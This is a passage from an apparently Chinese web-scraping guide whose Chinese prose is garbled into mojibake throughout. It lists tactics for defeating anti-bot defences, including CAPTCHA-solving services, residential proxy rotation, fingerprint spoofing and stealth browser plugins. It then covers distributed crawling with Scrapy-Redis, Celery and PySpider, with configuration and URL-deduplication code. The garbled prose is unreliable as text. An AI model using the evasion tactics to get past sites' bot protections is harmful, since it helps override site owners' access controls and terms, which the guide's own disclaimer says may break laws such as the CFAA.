<li><strong>è¡Œä¸ºåˆ†æ</strong>: é¼ æ ‡è½¨è¿¹ã€æ‰“å­—æ¨¡å¼ã€æµè§ˆå†å²</li>
<li><strong>è®¾å¤‡æŒ‡çº¹</strong>: Canvasã€WebGLã€Audio</li>
<li><strong>TLS æŒ‡çº¹</strong>: JA3/JA3S æ£€æµ‹</li>
<li><strong>API ç­¾å</strong>: æ—¶é—´æˆ³ + å¯†é’¥éªŒè¯</li>
</ol>
<h3>å¯¹æŠ—ç­–ç•¥</h3>
<ol>
<li><strong>CAPTCHA æ±‚è§£</strong>: ç¬¬ä¸‰æ–¹æœåŠ¡ã€æœºå™¨å­¦ä¹ </li>
<li><strong>IP è½®æ¢</strong>: ä»£ç†æ± ã€ä½å®…ä»£ç†</li>
<li><strong>è¡Œä¸ºæ¨¡æ‹Ÿ</strong>: é¼ æ ‡è½¨è¿¹ã€äººç±»åŒ–å»¶è¿Ÿ</li>
<li><strong>æµè§ˆå™¨æŒ‡çº¹ä¼ªé€ </strong>: Playwright Stealth</li>
<li><strong>API é€†å‘</strong>: å‘ç°éšè—æ¥å£</li>
<li><strong>åˆ†å¸ƒå¼çˆ¬å–</strong>: å¤šè´¦å·ã€å¤šåœ°åŸŸ</li>
</ol>
<hr />
<h2>æ³•å¾‹ä¸é“å¾·å£°æ˜</h2>
<p><strong>æœ¬æ–‡ä»…ç”¨äºæŠ€æœ¯ç ”ç©¶å’Œæ•™è‚²ç›®çš„</strong>ã€‚æœªç»æˆæƒçˆ¬å–æœç´¢å¼•æ“å¯èƒ½è¿å:</p>
<ul>
<li>æœåŠ¡æ¡æ¬¾ (ToS)</li>
<li>è®¡ç®—æœºæ¬ºè¯ˆå’Œæ»¥ç”¨æ³• (CFAA)</li>
<li>å„å›½åçˆ¬è™«æ³•å¾‹</li>
</ul>
<p>è¯·ä»…åœ¨æˆæƒç¯å¢ƒä¸‹è¿›è¡Œæµ‹è¯•ï¼Œå°Šé‡æœç´¢å¼•æ“çš„ robots.txtã€‚</p>
<hr />
<h2>å·¥å…·æ¨è</h2>
<h3>çˆ¬è™«æ¡†æ¶</h3>
<ul>
<li><strong>Scrapy</strong>: Python çˆ¬è™«æ¡†æ¶</li>
<li><strong>Playwright</strong>: ç°ä»£æµè§ˆå™¨è‡ªåŠ¨åŒ–</li>
<li><strong>Puppeteer</strong>: Node.js æµè§ˆå™¨æ§åˆ¶</li>
</ul>
<h3>ä»£ç†æœåŠ¡</h3>
<ul>
<li><strong>Bright Data</strong>: ä½å®…ä»£ç†æ± </li>
<li><strong>Oxylabs</strong>: ä¼ä¸šçº§ä»£ç†</li>
<li><strong>SmartProxy</strong>: ä½æˆæœ¬é€‰æ‹©</li>
</ul>
<h3>CAPTCHA æ±‚è§£</h3>
<ul>
<li><strong>2Captcha</strong>: äººå·¥æ±‚è§£æœåŠ¡</li>
<li><strong>Anti-Captcha</strong>: è‡ªåŠ¨è¯†åˆ«</li>
<li><strong>CapSolver</strong>: AI è¯†åˆ«</li>
</ul>
<h3>åæ£€æµ‹</h3>
<ul>
<li><strong>undetected-chromedriver</strong>: å Selenium æ£€æµ‹</li>
<li><strong>playwright-stealth</strong>: Playwright éšèº«</li>
<li><strong>puppeteer-extra-plugin-stealth</strong>: Puppeteer éšèº«</li>
</ul>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-15">æµè§ˆå™¨ DevTools ä½¿ç”¨</a></li>
<li>JavaScript Hook æŠ€æœ¯</li>
<li><a href="#section-34">æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«</a></li>
<li><a href="#section-42">TLS æŒ‡çº¹è¯†åˆ«</a></li>
<li><a href="#section-33">CAPTCHA è¯†åˆ«ä¸ç»•è¿‡</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-51">
                                                <h2>[R50] Distributed Scraping</h2>
                                                <h1>R50: åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„</h1>
<h2>æ¦‚è¿°</h2>
<p>éšç€æ•°æ®è§„æ¨¡çš„ä¸æ–­æ‰©å¤§ï¼Œå•æœºçˆ¬è™«åœ¨æ€§èƒ½ã€ç¨³å®šæ€§å’Œæ•ˆç‡ä¸Šé‡åˆ°äº†ç“¶é¢ˆã€‚åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„é€šè¿‡å°†çˆ¬å–ä»»åŠ¡åˆ†æ•£åˆ°å¤šå°æœºå™¨ä¸Šå¹¶è¡Œæ‰§è¡Œï¼Œå¯ä»¥å¤§å¹…æå‡çˆ¬å–æ•ˆç‡ï¼Œå®ç°åƒä¸‡çº§ç”šè‡³äº¿çº§çš„æ•°æ®é‡‡é›†ã€‚</p>
<p>æœ¬æ–‡ä»‹ç»åˆ†å¸ƒå¼çˆ¬è™«çš„æ ¸å¿ƒæ¦‚å¿µã€ä¸»æµæ¡†æ¶ã€æ¶æ„è®¾è®¡ã€å»é‡ç­–ç•¥ä»¥åŠç”Ÿäº§ç¯å¢ƒçš„æœ€ä½³å®è·µã€‚</p>
<hr />
<h2>åŸºç¡€æ¦‚å¿µ</h2>
<h3>å®šä¹‰</h3>
<p><strong>åˆ†å¸ƒå¼çˆ¬è™«</strong>æ˜¯æŒ‡å°†ç½‘é¡µæŠ“å–ä»»åŠ¡åˆ†æ•£åˆ°å¤šä¸ªç‹¬ç«‹çš„çˆ¬è™«èŠ‚ç‚¹ä¸Šå¹¶è¡Œæ‰§è¡Œçš„çˆ¬è™«ç³»ç»Ÿã€‚ä¸å•æœºçˆ¬è™«ç›¸æ¯”ï¼Œåˆ†å¸ƒå¼çˆ¬è™«é€šè¿‡ä»»åŠ¡åˆ†å‘ã€æ•°æ®å…±äº«å’ŒååŒå·¥ä½œï¼Œå®ç°äº†æ›´é«˜çš„ååé‡å’Œæ›´å¼ºçš„å®¹é”™èƒ½åŠ›ã€‚</p>
<h3>æ ¸å¿ƒåŸç†</h3>
<p>åˆ†å¸ƒå¼çˆ¬è™«çš„æ ¸å¿ƒæ˜¯è§£å†³ä»¥ä¸‹å‡ ä¸ªå…³é”®é—®é¢˜ï¼š</p>
<ol>
<li><strong>ä»»åŠ¡è°ƒåº¦</strong>ï¼šå¦‚ä½•æœ‰æ•ˆåœ°å°†å¾…çˆ¬å–çš„ URL åˆ†é…ç»™å„ä¸ªçˆ¬è™«èŠ‚ç‚¹</li>
<li><strong>URL å»é‡</strong>ï¼šå¦‚ä½•åœ¨å¤šèŠ‚ç‚¹ç¯å¢ƒä¸‹é¿å…é‡å¤çˆ¬å–åŒä¸€ä¸ª URL</li>
<li><strong>æ•°æ®å…±äº«</strong>ï¼šå¦‚ä½•è®©å„èŠ‚ç‚¹å…±äº«ä»»åŠ¡é˜Ÿåˆ—ã€å»é‡é›†åˆå’Œé…ç½®ä¿¡æ¯</li>
<li><strong>è´Ÿè½½å‡è¡¡</strong>ï¼šå¦‚ä½•ä¿è¯å„èŠ‚ç‚¹çš„ä»»åŠ¡é‡ç›¸å¯¹å‡è¡¡</li>
<li><strong>æ•…éšœæ¢å¤</strong>ï¼šå¦‚ä½•å¤„ç†èŠ‚ç‚¹æ•…éšœï¼Œä¿è¯ä»»åŠ¡ä¸ä¸¢å¤±</li>
</ol>
<h4>å…¸å‹æ¶æ„</h4>
<pre><code class="language-mermaid">graph TB
    subgraph Admin[&quot;ç®¡ç†æ§åˆ¶å±‚&quot;]
        Monitor[ç›‘æ§ä¸­å¿ƒ&lt;br/&gt;Prometheus + Grafana&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ çˆ¬å–é€Ÿåº¦ç›‘æ§&lt;br/&gt;â€¢ æˆåŠŸç‡ç»Ÿè®¡&lt;br/&gt;â€¢ é˜Ÿåˆ—é•¿åº¦å‘Šè­¦&lt;br/&gt;â€¢ èŠ‚ç‚¹å¥åº·æ£€æŸ¥]
        Config[é…ç½®ä¸­å¿ƒ&lt;br/&gt;Consul / etcd&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ åŠ¨æ€é…ç½®&lt;br/&gt;â€¢ æœåŠ¡å‘ç°&lt;br/&gt;â€¢ å‚æ•°ç®¡ç†]
    end

    subgraph Master[&quot;ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ (Master)&quot;]
        Redis[Redis Cluster&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ ä»»åŠ¡é˜Ÿåˆ— (List/ZSet)&lt;br/&gt;â€¢ URL å»é‡ (Set/BloomFilter)&lt;br/&gt;â€¢ åˆ†å¸ƒå¼é”&lt;br/&gt;â€¢ èŠ‚ç‚¹å¿ƒè·³]
        MQ[æ¶ˆæ¯é˜Ÿåˆ—&lt;br/&gt;RabbitMQ / Kafka&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ ä»»åŠ¡åˆ†å‘&lt;br/&gt;â€¢ ä¼˜å…ˆçº§è°ƒåº¦&lt;br/&gt;â€¢ æŒä¹…åŒ–é˜Ÿåˆ—]
    end

    subgraph Workers[&quot;çˆ¬è™«å·¥ä½œèŠ‚ç‚¹ (Workers)&quot;]
        W1[Worker 1&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Scrapy Engine&lt;br/&gt;â€¢ Downloader&lt;br/&gt;â€¢ Parser&lt;br/&gt;16 å¹¶å‘]
        W2[Worker 2&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Scrapy Engine&lt;br/&gt;â€¢ Downloader&lt;br/&gt;â€¢ Parser&lt;br/&gt;16 å¹¶å‘]
        W3[Worker 3&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Scrapy Engine&lt;br/&gt;â€¢ Downloader&lt;br/&gt;â€¢ Parser&lt;br/&gt;16 å¹¶å‘]
        WN[Worker N&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Scrapy Engine&lt;br/&gt;â€¢ Downloader&lt;br/&gt;â€¢ Parser&lt;br/&gt;16 å¹¶å‘]
    end

    subgraph Proxy[&quot;ä»£ç†æ± &quot;]
        ProxyPool[IP ä»£ç†æ± &lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ ä»£ç†è½®æ¢&lt;br/&gt;â€¢ å¥åº·æ£€æŸ¥&lt;br/&gt;â€¢ æ•…éšœè½¬ç§»]
    end

    subgraph Storage[&quot;æ•°æ®å­˜å‚¨å±‚&quot;]
        MongoDB[(MongoDB&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ çˆ¬å–æ•°æ®&lt;br/&gt;â€¢ çµæ´» Schema&lt;br/&gt;â€¢ åˆ†ç‰‡é›†ç¾¤)]
        MySQL[(MySQL&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ ç»“æ„åŒ–æ•°æ®&lt;br/&gt;â€¢ äº‹åŠ¡æ”¯æŒ)]
        ES[(Elasticsearch&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ å…¨æ–‡æœç´¢&lt;br/&gt;â€¢ å®æ—¶åˆ†æ)]
        Cache[(Redis Cache&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ çƒ­æ•°æ®ç¼“å­˜&lt;br/&gt;â€¢ ä¼šè¯å­˜å‚¨)]
    end

    Monitor -.ç›‘æ§.-&gt; Redis
    Monitor -.ç›‘æ§.-&gt; Workers
    Monitor -.ç›‘æ§.-&gt; Storage
    Config -.é…ç½®.-&gt; Workers

    Redis &lt;--&gt;|è·å–ä»»åŠ¡&lt;br/&gt;ä¸ŠæŠ¥çŠ¶æ€| W1
    Redis &lt;--&gt;|è·å–ä»»åŠ¡&lt;br/&gt;ä¸ŠæŠ¥çŠ¶æ€| W2
    Redis &lt;--&gt;|è·å–ä»»åŠ¡&lt;br/&gt;ä¸ŠæŠ¥çŠ¶æ€| W3
    Redis &lt;--&gt;|è·å–ä»»åŠ¡&lt;br/&gt;ä¸ŠæŠ¥çŠ¶æ€| WN

    MQ --&gt;|ä»»åŠ¡åˆ†å‘| Workers

    W1 --&gt;|ä½¿ç”¨ä»£ç†| ProxyPool
    W2 --&gt;|ä½¿ç”¨ä»£ç†| ProxyPool
    W3 --&gt;|ä½¿ç”¨ä»£ç†| ProxyPool
    WN --&gt;|ä½¿ç”¨ä»£ç†| ProxyPool

    W1 --&gt;|å­˜å‚¨æ•°æ®| MongoDB
    W2 --&gt;|å­˜å‚¨æ•°æ®| MongoDB
    W3 --&gt;|å­˜å‚¨æ•°æ®| MySQL
    WN --&gt;|å­˜å‚¨æ•°æ®| ES

    Workers --&gt;|ç¼“å­˜| Cache

    style Monitor fill:#4a90e2
    style Redis fill:#e74c3c
    style MQ fill:#f39c12
    style Workers fill:#27ae60
    style ProxyPool fill:#9b59b6
    style Storage fill:#3498db
</code></pre>
<h4>Scrapy-Redis åˆ†å¸ƒå¼æ¶æ„è¯¦è§£</h4>
<pre><code class="language-mermaid">sequenceDiagram
    participant M as Master æ§åˆ¶å°
    participant R as Redis&lt;br/&gt;(ä»»åŠ¡é˜Ÿåˆ—+å»é‡)
    participant S1 as Spider èŠ‚ç‚¹ 1
    participant S2 as Spider èŠ‚ç‚¹ 2
    participant S3 as Spider èŠ‚ç‚¹ N
    participant DB as MongoDB

    Note over M,DB: é˜¶æ®µ 1: åˆå§‹åŒ–

    M-&gt;&gt;R: LPUSH start_urls&lt;br/&gt;æ·»åŠ ç§å­ URL
    R--&gt;&gt;M: é˜Ÿåˆ—åˆå§‹åŒ–å®Œæˆ

    S1-&gt;&gt;R: å¯åŠ¨çˆ¬è™«&lt;br/&gt;è¿æ¥ Redis
    S2-&gt;&gt;R: å¯åŠ¨çˆ¬è™«&lt;br/&gt;è¿æ¥ Redis
    S3-&gt;&gt;R: å¯åŠ¨çˆ¬è™«&lt;br/&gt;è¿æ¥ Redis

    Note over M,DB: é˜¶æ®µ 2: ä»»åŠ¡ç«äº‰ä¸åˆ†å‘

    loop æŒç»­çˆ¬å–
        S1-&gt;&gt;R: RPOP requests&lt;br/&gt;è·å–ä»»åŠ¡
        R--&gt;&gt;S1: URL1

        S2-&gt;&gt;R: RPOP requests&lt;br/&gt;è·å–ä»»åŠ¡
        R--&gt;&gt;S2: URL2

        S3-&gt;&gt;R: RPOP requests&lt;br/&gt;è·å–ä»»åŠ¡
        R--&gt;&gt;S3: URL3

        Note over S1,S3: å¹¶è¡Œä¸‹è½½é¡µé¢

        S1-&gt;&gt;S1: ä¸‹è½½å¹¶è§£æ URL1
        S2-&gt;&gt;S2: ä¸‹è½½å¹¶è§£æ URL2
        S3-&gt;&gt;S3: ä¸‹è½½å¹¶è§£æ URL3

        Note over S1,S3: æå–æ–° URL

        S1-&gt;&gt;R: SADD dupefilter&lt;br/&gt;æ£€æŸ¥ URL æ˜¯å¦é‡å¤
        alt URL æœªé‡å¤
            R--&gt;&gt;S1: 1 (æ–° URL)
            S1-&gt;&gt;R: LPUSH requests&lt;br/&gt;æ·»åŠ æ–°ä»»åŠ¡
        else URL å·²å­˜åœ¨
            R--&gt;&gt;S1: 0 (é‡å¤)
            S1-&gt;&gt;S1: ä¸¢å¼ƒé‡å¤ URL
        end

        S2-&gt;&gt;R: SADD dupefilter&lt;br/&gt;æ£€æŸ¥å»é‡
        R--&gt;&gt;S2: URL çŠ¶æ€
        S2-&gt;&gt;R: LPUSH requests&lt;br/&gt;æ·»åŠ æ–°ä»»åŠ¡

        S3-&gt;&gt;R: SADD dupefilter&lt;br/&gt;æ£€æŸ¥å»é‡
        R--&gt;&gt;S3: URL çŠ¶æ€
        S3-&gt;&gt;R: LPUSH requests&lt;br/&gt;æ·»åŠ æ–°ä»»åŠ¡

        Note over S1,S3: å­˜å‚¨æ•°æ®

        S1-&gt;&gt;DB: å­˜å‚¨ Item
        S2-&gt;&gt;DB: å­˜å‚¨ Item
        S3-&gt;&gt;DB: å­˜å‚¨ Item
    end

    Note over M,DB: é˜¶æ®µ 3: å®Œæˆä¸æ¸…ç†

    S1-&gt;&gt;R: LLEN requests&lt;br/&gt;æ£€æŸ¥é˜Ÿåˆ—
    R--&gt;&gt;S1: 0 (é˜Ÿåˆ—ä¸ºç©º)
    Note over S1: ç­‰å¾…æ–°ä»»åŠ¡æˆ–é€€å‡º
</code></pre>
<h4>URL å»é‡ç­–ç•¥å¯¹æ¯”</h4>
<pre><code class="language-mermaid">graph TB
    Start[æ–° URL åˆ°è¾¾] --&gt; Choice{é€‰æ‹©å»é‡ç­–ç•¥}

    Choice --&gt;|å°è§„æ¨¡&lt;br/&gt;&lt; 1000ä¸‡| RedisSet[Redis Set&lt;br/&gt;â”â”â”â”â”â”â”â”]
    Choice --&gt;|å¤§è§„æ¨¡&lt;br/&gt;&gt; 1äº¿| BloomFilter[Bloom Filter&lt;br/&gt;â”â”â”â”â”â”â”â”]
    Choice --&gt;|è¶…å¤§è§„æ¨¡&lt;br/&gt;&gt; 10äº¿| Hybrid[æ··åˆç­–ç•¥&lt;br/&gt;â”â”â”â”â”â”â”â”]

    RedisSet --&gt; RS1[è®¡ç®— URL Hash&lt;br/&gt;MD5/SHA256]
    RS1 --&gt; RS2{SADD url_hash}
    RS2 --&gt;|è¿”å› 1| RS3[âœ… æ–° URL&lt;br/&gt;æ·»åŠ åˆ°é˜Ÿåˆ—]
    RS2 --&gt;|è¿”å› 0| RS4[âŒ é‡å¤ URL&lt;br/&gt;ä¸¢å¼ƒ]

    BloomFilter --&gt; BF1[è®¡ç®—å¤šä¸ª Hash&lt;br/&gt;6-7 ä¸ªå“ˆå¸Œå‡½æ•°]
    BF1 --&gt; BF2{æ£€æŸ¥æ‰€æœ‰ä½}
    BF2 --&gt;|ä»»ä¸€ä½ä¸º 0| BF3[âœ… å¯èƒ½æ–° URL&lt;br/&gt;è®¾ç½®æ‰€æœ‰ä½ä¸º 1]
    BF2 --&gt;|æ‰€æœ‰ä½ä¸º 1| BF4[âŒ å¯èƒ½é‡å¤&lt;br/&gt;ä¸¢å¼ƒ]

    BF3 --&gt; BF5[âš ï¸ å­˜åœ¨è¯¯åˆ¤&lt;br/&gt;è¯¯åˆ¤ç‡ 0.01%-0.1%]
    BF4 --&gt; BF6[âš ï¸ å¯èƒ½è¯¯åˆ¤&lt;br/&gt;æ–° URL è¢«å½“ä½œæ—§ URL]

    Hybrid --&gt; H1[ä¸¤çº§è¿‡æ»¤]
    H1 --&gt; H2[ç¬¬ä¸€çº§:&lt;br/&gt;Bloom Filter&lt;br/&gt;å¿«é€Ÿè¿‡æ»¤æ˜æ˜¾é‡å¤]
    H2 --&gt; H3{Bloom åˆ¤æ–­}
    H3 --&gt;|å¯èƒ½æ–°| H4[ç¬¬äºŒçº§:&lt;br/&gt;Redis Set&lt;br/&gt;ç²¾ç¡®éªŒè¯]
    H3 --&gt;|é‡å¤| H5[âŒ ä¸¢å¼ƒ]

    H4 --&gt; H6{Redis ç²¾ç¡®æ£€æŸ¥}
    H6 --&gt;|æ–° URL| H7[âœ… æ·»åŠ åˆ°é˜Ÿåˆ—]
    H6 --&gt;|é‡å¤| H5

    subgraph Comparison[&quot;æ€§èƒ½å¯¹æ¯”&quot;]
        T1[Redis Set&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;å†…å­˜: 8GB / 1äº¿&lt;br/&gt;é€Ÿåº¦: O1&lt;br/&gt;å‡†ç¡®: 100%]
        T2[Bloom Filter&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;å†…å­˜: 128MB / 1äº¿&lt;br/&gt;é€Ÿåº¦: O1&lt;br/&gt;å‡†ç¡®: 99.9%]
        T3[æ··åˆç­–ç•¥&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;å†…å­˜: ä¸­ç­‰&lt;br/&gt;é€Ÿåº¦: å¿«&lt;br/&gt;å‡†ç¡®: 99.99%]
    end

    style RS3 fill:#51cf66
    style RS4 fill:#ff6b6b
    style BF3 fill:#51cf66
    style BF4 fill:#ffd43b
    style BF5 fill:#ffd43b
    style BF6 fill:#ffd43b
    style H7 fill:#51cf66
    style H5 fill:#ff6b6b
</code></pre>
<hr />
<h2>è¯¦ç»†å†…å®¹</h2>
<h3>ä¸»æµåˆ†å¸ƒå¼çˆ¬è™«æ¡†æ¶</h3>
<h4>1. Scrapy-Redis</h4>
<p><strong>Scrapy-Redis</strong> æ˜¯åŸºäº Scrapy çš„åˆ†å¸ƒå¼æ‰©å±•ï¼Œä½¿ç”¨ Redis ä½œä¸ºä»»åŠ¡é˜Ÿåˆ—å’Œå»é‡æ•°æ®åº“ã€‚</p>
<p><strong>æ ¸å¿ƒç‰¹æ€§ï¼š</strong></p>
<ul>
<li><strong>å…±äº«è°ƒåº¦å™¨</strong>ï¼šä½¿ç”¨ Redis List ä½œä¸ºè¯·æ±‚é˜Ÿåˆ—</li>
<li><strong>åˆ†å¸ƒå¼å»é‡</strong>ï¼šä½¿ç”¨ Redis Set å®ç° URL å»é‡</li>
<li><strong>æŒä¹…åŒ–</strong>ï¼šä»»åŠ¡é˜Ÿåˆ—æŒä¹…åŒ–åˆ° Redisï¼Œæ”¯æŒæ–­ç‚¹ç»­çˆ¬</li>
<li><strong>åŠ¨æ€æ·»åŠ çˆ¬è™«</strong>ï¼šå¯ä»¥éšæ—¶å¯åŠ¨æˆ–åœæ­¢çˆ¬è™«èŠ‚ç‚¹</li>
</ul>
<p><strong>åŸºæœ¬é…ç½®ï¼š</strong></p>
<pre><code class="language-python"># settings.py
# å¯ç”¨ Scrapy-Redis è°ƒåº¦å™¨
SCHEDULER = &quot;scrapy_redis.scheduler.Scheduler&quot;

# å¯ç”¨å»é‡è¿‡æ»¤å™¨
DUPEFILTER_CLASS = &quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;

# å¯ç”¨ Scrapy-Redis Pipeline
ITEM_PIPELINES = {
    'scrapy_redis.pipelines.RedisPipeline': 300
}

# Redis è¿æ¥é…ç½®
REDIS_HOST = 'localhost'
REDIS_PORT = 6379

# é˜Ÿåˆ—æŒä¹…åŒ–
SCHEDULER_PERSIST = True

# è¯·æ±‚é˜Ÿåˆ—çš„é”®
SCHEDULER_QUEUE_KEY = '%(spider)s:requests'

# å»é‡é›†åˆçš„é”®
SCHEDULER_DUPEFILTER_KEY = '%(spider)s:dupefilter'
</code></pre>
<p><strong>çˆ¬è™«å®ç°ï¼š</strong></p>
<pre><code class="language-python"># spider.py
from scrapy_redis.spiders import RedisSpider

class MySpider(RedisSpider):
    name = 'myspider'
    redis_key = 'myspider:start_urls'

    def parse(self, response):
        # è§£æé€»è¾‘
        for item in self.extract_items(response):
            yield item

        # æå–æ–°çš„ URL
        for url in response.css('a::attr(href)').getall():
            yield response.follow(url, self.parse)
</code></pre>
<p><strong>å¯åŠ¨æ–¹å¼ï¼š</strong></p>
<pre><code class="language-bash"># åœ¨å¤šå°æœºå™¨ä¸Šå¯åŠ¨çˆ¬è™«
scrapy crawl myspider

# å‘ Redis æ·»åŠ èµ·å§‹ URL
redis-cli lpush myspider:start_urls &quot;http://example.com&quot;
</code></pre>
<h4>2. Celery + Scrapy</h4>
<p><strong>Celery</strong> æ˜¯ Python åˆ†å¸ƒå¼ä»»åŠ¡é˜Ÿåˆ—æ¡†æ¶ï¼Œå¯ä»¥ä¸ Scrapy ç»“åˆå®ç°æ›´çµæ´»çš„ä»»åŠ¡è°ƒåº¦ã€‚</p>
<p><strong>æ¶æ„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>å¼‚æ­¥ä»»åŠ¡</strong>ï¼šçˆ¬å–ä»»åŠ¡ä»¥å¼‚æ­¥æ–¹å¼æ‰§è¡Œ</li>
<li><strong>ä»»åŠ¡é‡è¯•</strong>ï¼šæ”¯æŒå¤±è´¥ä»»åŠ¡è‡ªåŠ¨é‡è¯•</li>
<li><strong>å®šæ—¶ä»»åŠ¡</strong>ï¼šæ”¯æŒå®šæ—¶è§¦å‘çˆ¬å–ä»»åŠ¡</li>
<li><strong>ç›‘æ§ç®¡ç†</strong>ï¼šä½¿ç”¨ Flower ç›‘æ§ä»»åŠ¡çŠ¶æ€</li>
</ul>
<p><strong>é…ç½®ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="language-python"># celery_app.py
from celery import Celery

app = Celery('crawler',
             broker='redis://localhost:6379/0',
             backend='redis://localhost:6379/0')

app.conf.update(
    task_serializer='json',
    result_serializer='json',
    accept_content=['json'],
    timezone='Asia/Shanghai',
    enable_utc=True,
)

@app.task(bind=True, max_retries=3)
def crawl_task(self, url):
    &quot;&quot;&quot;çˆ¬å–ä»»åŠ¡&quot;&quot;&quot;
    try:
        process = CrawlerProcess(get_project_settings())
        process.crawl(MySpider, start_urls=[url])
        process.start()
    except Exception as exc:
        raise self.retry(exc=exc, countdown=60)
</code></pre>
<p><strong>å¯åŠ¨ Workerï¼š</strong></p>
<pre><code class="language-bash"># å¯åŠ¨ Celery Worker
celery -A celery_app worker --loglevel=info

# ä½¿ç”¨ Flower ç›‘æ§
celery -A celery_app flower
</code></pre>
<h4>3. PySpider</h4>
<p><strong>PySpider</strong> æ˜¯ä¸€ä¸ªè‡ªå¸¦ WebUI çš„åˆ†å¸ƒå¼çˆ¬è™«æ¡†æ¶ã€‚</p>
<p><strong>ä¸»è¦ç‰¹æ€§ï¼š</strong></p>
<ul>
<li><strong>å¯è§†åŒ–ç•Œé¢</strong>ï¼šWeb UI ç®¡ç†çˆ¬è™«å’ŒæŸ¥çœ‹ç»“æœ</li>
<li><strong>è„šæœ¬ç¼–è¾‘å™¨</strong>ï¼šåœ¨çº¿ç¼–è¾‘å’Œè°ƒè¯•çˆ¬è™«è„šæœ¬</li>
<li><strong>ä»»åŠ¡ç›‘æ§</strong>ï¼šå®æ—¶æŸ¥çœ‹çˆ¬å–è¿›åº¦å’ŒçŠ¶æ€</li>
<li><strong>å†…ç½®è°ƒåº¦å™¨</strong>ï¼šæ”¯æŒä¼˜å…ˆçº§è°ƒåº¦å’Œå‘¨æœŸä»»åŠ¡</li>
</ul>
<p><strong>ç®€å•ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="language-python">from pyspider.libs.base_handler import *

class Handler(BaseHandler):
    crawl_config = {
        'itag': 'v1',
    }

    @every(minutes=24 * 60)
    def on_start(self):
        self.crawl('http://example.com', callback=self.index_page)

    @config(age=10 * 24 * 60 * 60)
    def index_page(self, response):
        for each in response.doc('a[href^=&quot;http&quot;]').items():
            self.crawl(each.attr.href, callback=self.detail_page)

    def detail_page(self, response):
        return {
            &quot;url&quot;: response.url,
            &quot;title&quot;: response.doc('title').text(),
        }
</code></pre>
<h3>URL å»é‡ç­–ç•¥</h3>
<h4>1. åŸºäº Redis Set</h4>
<p><strong>åŸç†</strong>ï¼šä½¿ç”¨ Redis çš„ Set æ•°æ®ç»“æ„å­˜å‚¨å·²çˆ¬å–çš„ URL çš„å“ˆå¸Œå€¼ã€‚</p>
<p><strong>ä¼˜ç‚¹</strong>ï¼š</p>
<ul>
<li>å®ç°ç®€å•</li>
<li>æŸ¥è¯¢é€Ÿåº¦å¿«ï¼ˆO(1)ï¼‰</li>
<li>æ”¯æŒåˆ†å¸ƒå¼</li>
</ul>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>å†…å­˜å ç”¨å¤§ï¼ˆ1 äº¿ URL çº¦éœ€ 4-8 GBï¼‰</li>
</ul>
<p><strong>å®ç°ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="language-python">import redis
import hashlib

class RedisDeduplicator:
    def __init__(self, host='localhost', port=6379):
        self.r = redis.Redis(host=host, port=port)
        self.key = 'crawler:urls'

    def url_hash(self, url):
        &quot;&quot;&quot;è®¡ç®— URL å“ˆå¸Œ&quot;&quot;&quot;
        return hashlib.md5(url.encode()).hexdigest()

    def is_duplicate(self, url):
        &quot;&quot;&quot;æ£€æŸ¥ URL æ˜¯å¦é‡å¤&quot;&quot;&quot;
        url_hash = self.url_hash(url)
        return self.r.sismember(self.key, url_hash)

    def add_url(self, url):
        &quot;&quot;&quot;æ·»åŠ  URL åˆ°å»é‡é›†åˆ&quot;&quot;&quot;
        url_hash = self.url_hash(url)
        return self.r.sadd(self.key, url_hash)

    def check_and_add(self, url):
        &quot;&quot;&quot;æ£€æŸ¥å¹¶æ·»åŠ ï¼ˆåŸå­æ“ä½œï¼‰&quot;&quot;&quot;
        url_hash = self.url_hash(url)
        # è¿”å› 1 è¡¨ç¤ºæ–° URLï¼Œ0 è¡¨ç¤ºé‡å¤
        return self.r.sadd(self.key, url_hash) == 1
</code></pre>
<h4>2. åŸºäº Bloom Filterï¼ˆå¸ƒéš†è¿‡æ»¤å™¨ï¼‰</h4>
<p><strong>åŸç†</strong>ï¼šä½¿ç”¨å¤šä¸ªå“ˆå¸Œå‡½æ•°å°† URL æ˜ å°„åˆ°ä½æ•°ç»„ï¼Œç©ºé—´æ•ˆç‡æé«˜ä½†å­˜åœ¨ä¸€å®šè¯¯åˆ¤ç‡ã€‚</p>
<p><strong>ä¼˜ç‚¹</strong>ï¼š</p>
<ul>
<li>å†…å­˜å ç”¨æå°ï¼ˆ1 äº¿ URL çº¦éœ€ 120 MBï¼Œè¯¯åˆ¤ç‡ 0.1%ï¼‰</li>
<li>æŸ¥è¯¢é€Ÿåº¦å¿«</li>
<li>é€‚åˆæµ·é‡æ•°æ®å»é‡</li>
</ul>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>å­˜åœ¨è¯¯åˆ¤ï¼ˆå¯èƒ½å°†æœªçˆ¬å–çš„ URL è¯¯åˆ¤ä¸ºå·²çˆ¬å–ï¼‰</li>
